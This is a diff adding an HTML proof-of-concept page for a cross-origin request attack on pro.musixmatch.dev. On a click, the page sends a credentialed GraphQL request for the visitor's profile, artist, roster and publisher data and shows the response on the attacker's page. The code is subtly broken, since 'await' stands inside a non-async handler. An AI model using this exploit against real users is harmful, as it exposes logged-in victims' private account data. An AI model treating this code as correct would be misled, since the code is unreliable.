@@ -1,0 +1,40 @@
+<html>
+<body>
+  <p>Click anywhere on this page to trigger the Cross-origin request.</p>
+  <div id="response"></div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      document.onclick = () => {
+        open('https://pro.musixmatch.dev/');
+
+       
+	await fetch("https://pro.musixmatch.dev/ws/1.1/credits.atlantis?app_id=mxm-pro-web-v1.0-dev", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "content-type": "application/json",
+        "x-mxm-app-version": "2.45.0",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+    },
+    "referrer": "https://pro.musixmatch.dev/",
+    "body": "{\"operationName\":\"userControlledProfilesGet\",\"variables\":{},\"query\":\"fragment ImageFragment on Image {\\n  image {\\n    image_format_list {\\n      image_format {\\n        image_url\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n\\nquery userControlledProfilesGet {\\n  userControlledProfiles {\\n    professionals {\\n      aliases\\n      avatar_img_url\\n      claim_status\\n      cover_img_url\\n      first_name\\n      id\\n      name\\n      settings {\\n        hide_legal_name\\n        __typename\\n      }\\n      stage_name\\n      vanity\\n      __typename\\n    }\\n    artists {\\n      artist_id\\n      artist_image {\\n        ...ImageFragment\\n        __typename\\n      }\\n      artist_image_tagged {\\n        cover_picture {\\n          ...ImageFragment\\n          __typename\\n        }\\n        profile_picture {\\n          ...ImageFragment\\n          __typename\\n        }\\n        __typename\\n      }\\n      artist_name\\n      artist_rating\\n      claimed_by_user\\n      managed_status\\n      resource_id\\n      __typename\\n    }\\n    rosters {\\n      biography\\n      claim_status\\n      country_code\\n      description\\n      display_name\\n      is_created_by_user\\n      name\\n      role_in_roster\\n      registry_id\\n      type\\n      vanity\\n      __typename\\n    }\\n    publishers {\\n      alias_list\\n      claim_status\\n      description\\n      id\\n      ipi_list\\n      name\\n      role\\n      vanity\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}",
+    "method": "POST",
+    "mode": "cors"
+}) 
+.then(response => response.json())
+          .then(data => {
+            document.getElementById('response').innerHTML = JSON.stringify(data, null, 2);
+          })
+          .catch(error => {
+            console.log('Failed to issue Cross-origin request');
+          });
+      }
+    });
+  </script>
+</body>
+</html>
